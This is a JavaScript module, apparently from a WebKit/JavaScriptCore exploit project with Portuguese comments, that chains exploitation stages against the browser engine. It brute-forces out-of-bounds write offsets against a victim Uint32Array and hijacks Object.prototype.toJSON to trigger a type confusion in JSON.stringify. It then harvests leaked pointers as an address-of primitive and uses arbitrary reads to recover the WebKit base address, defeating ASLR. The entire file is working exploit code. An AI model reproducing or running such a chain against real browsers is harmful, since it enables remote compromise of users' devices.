// js/script3/testArrayBufferVictimCrash.mjs (R43L - Testes Massivos Finais para Addrof - CORRIGIDO)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_MassiveFinalAddrof_Corrected";

const VICTIM_TA_SIZE_ELEMENTS = 16;
const VICTIM_TA_BUFFER_SIZE_BYTES = VICTIM_TA_SIZE_ELEMENTS * 4;

const OOB_OFFSETS_TO_TEST_FINAL = [0x6C, 0x70, 0x74, 0x78, 0x7C, 0x80, 0x84, 0x88, 0x8C, 0x90];
const OOB_VALUES_TO_TEST_FINAL = [
    0xABABABAB, 0xCDCDCDCD, 0xFFFFFFFF, 0x00000000, 0x41414141,
    (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 0xDEF00002),
];

const FILL_PATTERN_VICTIM_TA_FINAL = 0xBADF00D5;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let target_function_for_webkit_leak;
let leaked_m2_or_target_addr = null; // Endereço que esperamos vazar

// Flags globais de sucesso para possível parada antecipada
let global_addrof_obtained_flag = false;
let global_webkit_leak_obtained_flag = false;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}
function logTypedArrayShort(ta, name = "TypedArray", max = 8) { /* ... (sem alteração) ... */
    if (!ta || typeof ta.slice !== 'function') { return "N/A"; }
    const content = Array.from(ta.slice(0, Math.min(ta.length, max))).map(v => safeToHex(v));
    return `${name}[${content.join(", ")}${ta.length > max ? "..." : ""}] (len:${ta.length}, byteLen:${ta.byteLength})`;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Testes Massivos Finais Addrof (Corrigido) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init MassiveFinalCor...`;

    target_function_for_webkit_leak = function someUniqueLeakFunctionR43L_MassiveFinalCor() { return `target_R43L_MassiveFinalCor_${Date.now()}`; };
    
    // CORRIGIDO: Inicializar aqui para o escopo da função
    let final_probe_call_count_for_report = 0; 

    logS3(`--- Fase 0 (MassiveFinalCor): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { /* ... (retorno de erro) ... */
         return { errorOccurred: "OOB Sanity Check Failed", tc_probe_details: null, 
                 addrof_result: { success: false, msg: "Addrof (MassiveFinalCor): Not run." },
                 webkit_leak_result: { success: false, msg: "WebKit Leak (MassiveFinalCor): Not run." },
                 iteration_results_summary: [], total_probe_calls_last_iter: 0, 
                 oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false, 
                 best_victim_analysis: null }; 
    }

    let iteration_results_summary = [];
    let best_result_overall = {
        errorOccurred: null, tc_probe_details: null, stringifyResultSonda: null,
        addrof_result: { success: false, msg: "Addrof (MassiveFinalCor): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (MassiveFinalCor): Não obtido.", webkit_base_candidate: null },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        best_victim_analysis: null,
        total_probe_calls_last_iter: 0 // Adicionar este campo aqui
    };
    
    // Resetar flags globais no início de cada execução completa
    global_addrof_obtained_flag = false;
    global_webkit_leak_obtained_flag = false;

    for (const current_oob_offset of OOB_OFFSETS_TO_TEST_FINAL) {
        if (global_addrof_obtained_flag && global_webkit_leak_obtained_flag) break; 

        for (const current_oob_value of OOB_VALUES_TO_TEST_FINAL) {
            if (global_addrof_obtained_flag && global_webkit_leak_obtained_flag) break;
            if (current_oob_value === null || current_oob_value === undefined) continue;

            leaked_m2_or_target_addr = null;
            // CORRIGIDO: Declarar flags de sucesso da iteração aqui
            let found_addrof_primitive_in_iteration = false;
            // let found_arb_rw_via_victim_ta_in_iteration = false; // Se for reintroduzir esta lógica

            const current_oob_hex_val = safeToHex(current_oob_value);
            const current_offset_hex = safeToHex(current_oob_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

            logS3(`\n===== ITERATION MassiveFinalCor: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let victim_ta_for_json_trigger = null;
            let iter_victim_analysis = { /* ... (estrutura como antes) ... */
                offset_tested: current_offset_hex, value_written: current_oob_hex_val, notes: "",
                found_pointers_in_victim_ta: [], addrof_achieved_via_victim_corruption: false
            };

            let probe_call_count_iter = 0;
            let m1_ref = null; let m2_ref = null;
            let tc_detected_this_iter = false;
            let tc_details_this_iter = null;

            function massive_final_corrected_probe_toJSON() { // Nome da sonda atualizado
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === m2_ref && m2_ref !== null);

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    if (call_num === 1 && this === victim_ta_for_json_trigger) {
                        m2_ref = { id: "M2_MassiveFinalCor", target_function_prop: target_function_for_webkit_leak };
                        m1_ref = { id: "M1_MassiveFinalCor", m2: m2_ref };
                        logS3(`[PROBE_MassiveFinalCor] Call #${call_num}: 'this' é victim_ta_for_json_trigger. M1/M2 criados.`, "debug_detail");
                        
                        logS3(`   [PROBE_MassiveFinalCor] Analisando victim_ta_for_json_trigger DENTRO da 1a chamada da sonda (após OOB e M1/M2 alloc):`, "info_emphasis");
                        for (let i = 0; i < victim_ta_for_json_trigger.length - 1; i += 2) {
                            const low = victim_ta_for_json_trigger[i];
                            const high = victim_ta_for_json_trigger[i+1];
                            if (low !== FILL_PATTERN_VICTIM_TA_FINAL || high !== FILL_PATTERN_VICTIM_TA_FINAL) {
                                let potential_ptr = new AdvancedInt64(low, high);
                                logS3(`     victim_ta[${i}/${i+1}]: L=0x${low.toString(16)}, H=0x${high.toString(16)} -> ${potential_ptr.toString(true)}`, "leak");
                                if (isValidPointer(potential_ptr, "_victimCorruptionCheck")) {
                                    logS3(`       !!! PONTEIRO VÁLIDO ENCONTRADO em victim_ta[${i}/${i+1}]: ${potential_ptr.toString(true)} !!!`, "success_major");
                                    iter_victim_analysis.found_pointers_in_victim_ta.push({index: i, low: low, high: high, addr_str: potential_ptr.toString(true)});
                                    if (!leaked_m2_or_target_addr) { // Pegar o primeiro ponteiro válido encontrado
                                        leaked_m2_or_target_addr = potential_ptr;
                                        iter_victim_analysis.addrof_achieved_via_victim_corruption = true;
                                        found_addrof_primitive_in_iteration = true; // Flag da iteração
                                        // global_addrof_obtained_flag será setado fora da sonda, após a iteração, se este for o melhor resultado.
                                        iter_victim_analysis.notes += `Addrof putativo via victim_ta[${i}]: ${potential_ptr.toString(true)}. `;
                                    }
                                }
                            }
                        }
                        if (!iter_victim_analysis.addrof_achieved_via_victim_corruption) {
                            logS3(`   [PROBE_MassiveFinalCor] Nenhum ponteiro válido óbvio encontrado em victim_ta.`, "info");
                        }
                        return m1_ref;
                    } else if (is_m2c) {
                        if (!tc_detected_this_iter) {
                            tc_detected_this_iter = true;
                            tc_details_this_iter = { call_number_tc_detected: call_num, probe_variant:"MassiveFinalCor", this_is_M2: true, notes: "TC Confirmada."};
                            logS3(`[PROBE_MassiveFinalCor] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}).`, "vuln");
                        }
                        return this;
                    }
                } catch (e_pm) { /* ... */ }
                return { gen_m: call_num, type: ctts };
            }

            let iter_primary_error = null;
            let iter_stringify_output_raw = null;
            try {
                victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS);
                victim_ta_for_json_trigger.fill(FILL_PATTERN_VICTIM_TA_FINAL);
                logS3(`   Victim Uint32Array (victim_ta_for_json_trigger) criado e preenchido com padrão 0x${FILL_PATTERN_VICTIM_TA_FINAL.toString(16)}.`, 'info');

                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                logS3(`   OOB Write: ${current_oob_hex_val} @ ${current_offset_hex}`, 'info');
                await PAUSE_S3(150);

                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: massive_final_corrected_probe_toJSON, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    iter_stringify_output_raw = JSON.stringify(victim_ta_for_json_trigger);
                    logS3(`   JSON.stringify output: ${iter_stringify_output_raw ? iter_stringify_output_raw.substring(0,100) : "null" }...`, "debug_detail");
                    if (tc_detected_this_iter) logS3(`  TC Probe (MassiveFinalCor): TC CONFIRMADA.`, "vuln");
                    else logS3(`  TC Probe (MassiveFinalCor): TC NÃO Confirmada.`, "warn");
                } catch (e_str) { iter_primary_error = e_str; logS3(`  JSON.stringify EXCEPTION: ${e_str.message}`, "error"); }
                finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

                // Atualizar flags globais e resultado principal se addrof foi encontrado NESTA iteração
                if (found_addrof_primitive_in_iteration && leaked_m2_or_target_addr) {
                    global_addrof_obtained_flag = true; // Sinalizar sucesso global
                    best_result_overall.addrof_result = { 
                        success: true, 
                        msg: `Addrof obtido via corrupção de victim_ta: ${leaked_m2_or_target_addr.toString(true)} (Off:${current_offset_hex} Val:${current_oob_hex_val})`, 
                        leaked_object_addr: leaked_m2_or_target_addr.toString(true) 
                    };
                    logS3(`ADDROF OBTIDO GLOBALMENTE: ${leaked_m2_or_target_addr.toString(true)} com Off:${current_offset_hex} Val:${current_oob_hex_val}`, "success_major");

                    // Tentar WebKitLeak
                    if (arb_read) {
                        // Assumindo que leaked_m2_or_target_addr é o endereço da target_function_for_webkit_leak
                        // Isso é uma grande suposição. A lógica aqui precisaria de mais refinamento
                        // para confirmar o que o endereço realmente representa.
                        let addr_for_wk_leak = null;
                        // Se o ponteiro vazado for para M2, e M2.target_function_prop for a função alvo:
                        // Precisaríamos ler M2.target_function_prop.
                        // Por simplicidade, vamos assumir que leaked_m2_or_target_addr É o endereço da função se for válido.
                        // No futuro, a sonda poderia tentar identificar melhor o que o ponteiro vazado representa.
                        if (isValidPointer(leaked_m2_or_target_addr, "_preWkLeakCheck")) {
                             addr_for_wk_leak = leaked_m2_or_target_addr; // Usar diretamente por agora
                        }
                        
                        if (addr_for_wk_leak) { // Se temos um candidato a endereço de função
                            logS3(`  Tentando WebKitLeak com endereço: ${addr_for_wk_leak.toString(true)}`, "info_emphasis");
                            try {
                                const ptr_exe = await arb_read(addr_for_wk_leak.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                                if (isValidPointer(ptr_exe, "_wkLeakExeFinal")) {
                                    const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                                    if (isValidPointer(ptr_jitvm, "_wkLeakJitVmFinal")) {
                                        const base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
                                        logS3(`  !!! POTENCIAL WEBKIT BASE: ${base_candidate.toString(true)} !!!`, "success_major");
                                        best_result_overall.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${base_candidate.toString(true)}`, webkit_base_candidate: base_candidate.toString(true) };
                                        global_webkit_leak_obtained_flag = true;
                                    } else { throw new Error("Ponteiro JIT/VM inválido para WebKitLeak."); }
                                } else { throw new Error("Ponteiro Executable inválido para WebKitLeak."); }
                            } catch(e_wk_leak) {
                                logS3(`  Erro no WebKitLeak: ${e_wk_leak.message}`, "error");
                                best_result_overall.webkit_leak_result = { success: false, msg: `WebKitLeak falhou: ${e_wk_leak.message}` };
                            }
                        } else {
                             logS3("  Endereço para WebKitLeak não é válido ou não foi determinado como sendo de função.", "warn");
                             best_result_overall.webkit_leak_result = { success: false, msg: "Endereço para WebKitLeak inválido." };
                        }
                    }
                }

            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

            // final_probe_call_count_for_report será o da última iteração bem sucedida ou da última geral
            final_probe_call_count_for_report = probe_call_count_iter; 

            let current_iter_summary = {
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
                raw_oob_offset: current_oob_offset, raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: tc_details_this_iter,
                victim_ta_analysis: iter_victim_analysis,
                addrof_success_this_iter: found_addrof_primitive_in_iteration,
                webkit_leak_success_this_iter: global_webkit_leak_obtained_flag && found_addrof_primitive_in_iteration,
                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_overall (simplificada para priorizar addrof e webkitleak)
            if (current_iter_summary.error === null) {
                let current_is_better = false;
                if (!best_result_overall.webkit_leak_result.success && current_iter_summary.webkit_leak_success_this_iter) {
                    current_is_better = true;
                } else if (best_result_overall.webkit_leak_result.success === current_iter_summary.webkit_leak_success_this_iter) {
                    if (!best_result_overall.addrof_result.success && current_iter_summary.addrof_success_this_iter) {
                        current_is_better = true;
                    } else if (best_result_overall.addrof_result.success === current_iter_summary.addrof_success_this_iter) {
                        if (!best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe && current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe) {
                            current_is_better = true;
                        }
                    }
                }
                if (best_result_overall.oob_params_of_best_result === null) current_is_better = true; // Primeiro resultado sem erro

                if (current_is_better) {
                    best_result_overall.errorOccurred = null;
                    best_result_overall.tc_probe_details = current_iter_summary.tc_probe_details;
                    // addrof_result e webkit_leak_result já foram atualizados globalmente se sucesso
                    best_result_overall.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_oob_offset, raw_value: current_oob_value };
                    best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                    best_result_overall.best_victim_analysis = current_iter_summary.victim_ta_analysis;
                    if (current_iter_summary.addrof_success_this_iter || current_iter_summary.webkit_leak_success_this_iter) {
                        logS3(`*** NOVO MELHOR RESULTADO ATUALIZADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof:${best_result_overall.addrof_result.success}, WKLeak:${best_result_overall.webkit_leak_result.success}, TC:${current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe}) ***`, "success_major");
                    }
                }
            }
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} Addr:${found_addrof_primitive_in_iteration}`;
            await PAUSE_S3(50);
        }
        if (global_addrof_obtained_flag && global_webkit_leak_obtained_flag) break;
        await PAUSE_S3(100);
    }

    best_result_overall.total_probe_calls_last_iter = final_probe_call_count_for_report;
    best_result_overall.iteration_results_summary = iteration_results_summary;
    best_result_overall.oob_value_of_best_result = best_result_overall.oob_params_of_best_result ? `${best_result_overall.oob_params_of_best_result.offset}_${best_result_overall.oob_params_of_best_result.value}` : "N/A";
    // heisenbug_on_M2_in_best_result já está em best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_overall (MassiveFinalCor): ${JSON.stringify(best_result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(best_result_overall.webkit_leak_result.success) final_title += "WEBKITLEAK_OK! ";
    else if(best_result_overall.addrof_result.success) final_title += "ADDROF_OK! ";
    else if(best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) final_title += "TC_OK ";
    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
    document.title = final_title.trim();

    return best_result_overall;
}
